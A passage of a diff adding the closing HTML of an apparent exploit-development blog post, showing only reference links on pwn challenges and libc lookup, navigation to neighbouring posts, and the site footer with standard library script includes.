+<li><a href="https://www.hackthebox.com/home/challenges/Pwn">https://www.hackthebox.com/home/challenges/Pwn</a></li>
+<li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
+<li><a href="https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got">https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got</a></li>
+</ul>
+
+
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-DEP-Part-4/" data-toggle="tooltip" data-placement="top" title="Windows User Mode Exploit Development: Data Execution Prevention (DEP) Part 4">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://memn0ps.github.io/XMAS-Pwn-Santa-Tobacco-Shop/" data-toggle="tooltip" data-placement="top" title="XMAS Pwn: Santa&#39;s Tobacco Shop">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/memN0ps" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/memN0ps" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              memN0ps
+            
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2022
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://memn0ps.github.io/">memN0ps</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.93.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script src="https://memn0ps.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://memn0ps.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
